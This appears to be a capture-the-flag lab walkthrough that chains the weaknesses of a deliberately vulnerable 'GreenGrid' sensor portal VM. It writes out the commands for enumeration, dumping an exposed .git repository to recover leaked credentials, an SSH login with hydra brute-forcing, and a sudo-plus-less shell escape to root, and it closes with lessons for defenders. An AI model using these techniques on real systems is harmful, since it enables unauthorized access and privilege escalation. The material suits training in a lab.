# GreenGrid Sensor Portal — Lab Walkthrough

**Theme:** A fictional startup, GreenGrid, builds a web portal for
monitoring soil-moisture/greenhouse sensors used by small urban farms.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_greengrid.sh` target running on your own isolated lab VM only.
Do not run these techniques against systems you do not own or lack
explicit authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found through basic enumeration, no exploitation required.
- `INTERMEDIATE_FLAG.txt` — found after gaining a low-privilege shell.
- `HARD_FLAG.txt` — found after privilege escalation to root.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_greengrid.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_greengrid.sh
   sudo ./setup_greengrid.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

Enumerate the web root:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt
```

You should find several interesting paths, including:
- `/notes/` (directory listing enabled)
- `/.git/` (readable)
- `/config.php.bak`

Visit `/notes/` in a browser or with `curl` — directory indexing is on,
and you'll see `EASY_FLAG.txt` sitting right there.

```bash
curl http://<target-ip>/notes/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required enumeration.

---

## Part 2 – Identify Vulnerabilities

Two separate weaknesses need to be chained here:

### 2a. Exposed `.git` repository (initial access)

The web root has a live `.git` directory. Dump it with a plain `git
clone` (the target serves the dumb-HTTP `info/refs` data, so no extra
tooling is required):

```bash
git clone http://<target-ip>/.git/ greengrid-git-dump
cd greengrid-git-dump
git log --all --oneline
```

**If `git clone` reports "repository not found":** the target's
`.git/info/refs` wasn't generated. On the target VM, run:

```bash
cd /var/www/html
sudo git update-server-info
sudo chmod -R o+r .git
```

Then retry the `git clone` from your attacker machine.

**Alternative (no fix required on the target):** if you're on an
attacker box with internet access, `git-dumper` recursively pulls the
repo without needing dumb-HTTP support:

```bash
sudo apt install -y pipx
pipx install git-dumper
pipx ensurepath
# open a new terminal, or run: source ~/.bashrc
git-dumper http://<target-ip>/.git/ greengrid-git-dump
```

Note: `git-dumper` installs from PyPI, so this only works if your
attacker VM has outbound internet access. On a fully isolated lab
network (recommended), use the `git update-server-info` fix above
instead.

Walk the commit history — you'll find a commit titled something like
*"backup config before password rotation"* that added
`config.php.bak`. Check it out:

```bash
git show <commit-hash>:config.php.bak
```

This reveals:
- Database credentials (`gg_app` / `H0useplant!99`)
- A comment referencing an on-call SSH fallback account:
  `ggtech / sunshine`

### 2b. sudo misconfiguration (privilege escalation, confirmed later)

Not visible yet — this is discovered *after* you have a shell, in
Part 4. Keep it in mind as the next phase of the chain.

---

## Part 3 – Gain Access

Try the leaked credentials over SSH:

```bash
ssh ggtech@<target-ip>
# password: sunshine
```

(You could also confirm the credential pair with `hydra` against the
single known username, for practice with brute-force tooling. On
Kali, `rockyou.txt` ships gzipped — unzip it first if you haven't
already:)

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hydra -l ggtech -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

Once logged in as `ggtech`, grab the second flag:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

---

## Part 4 – Privilege Escalation

Enumerate your sudo rights:

```bash
sudo -l
```

Expected output shows something like:

```
User ggtech may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/gg_logview.sh *
```

Inspect the script:

```bash
cat /usr/local/sbin/gg_logview.sh
```

It builds a path from your argument and pipes it straight into
`less`. This is a classic GTFOBins pattern — `less` (invoked as root)
can spawn a shell from its pager prompt. Trigger it:

```bash
sudo /usr/local/sbin/gg_logview.sh uplink.log
```

Inside the `less` pager, type:

```
!/bin/bash
```

This spawns a root shell (`less`'s `!` command runs a shell command,
and since `less` was launched via `sudo`, the shell inherits root).
Confirm:

```bash
id
```

You should see `uid=0(root)`.

---

## Part 5 – Capture the Flags

From your root shell:

```bash
cat /root/HARD_FLAG.txt
```

**🚩 HARD_FLAG captured.**

You should now have all three:
- `EASY_FLAG.txt` — from `/notes/` via directory listing
- `INTERMEDIATE_FLAG.txt` — from `ggtech`'s home directory
- `HARD_FLAG.txt` — from `/root/`

---

## Summary of the Vulnerability Chain

1. **Reconnaissance shortcut:** an exposed, indexable `/notes/`
   directory hands over the easy flag with zero exploitation —
   illustrates why directory listing should never be enabled on
   production web servers.
2. **Initial access — exposed `.git` repository:** the deployment
   process left `.git` world-readable in the web root. Its commit
   history contained a "removed" backup config file with live
   database credentials and a comment revealing a reused SSH password
   for the `ggtech` account.
3. **Privilege escalation — sudo NOPASSWD + GTFOBins pivot:** `ggtech`
   was granted passwordless sudo rights to a custom log-viewing script
   that shells out to `less`. Because `less` supports spawning a
   subshell from its pager, and it runs as root under sudo, this
   became a direct path to a root shell.

**Root cause lessons for defenders:**
- Never deploy a `.git` directory into a public web root; use a build
  step that only ships compiled/static assets.
- Rotate *and* remove old credentials — don't leave them in backup
  files or commit history.
- Avoid `NOPASSWD` sudo grants to scripts that wrap interactive or
  pager-capable binaries (`less`, `more`, `vim`, `man`, etc.); check
  any custom sudo rule against GTFOBins-style escape techniques.
- Disable directory indexing (`Options -Indexes`) unless explicitly
  required.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `sunshine` anywhere real).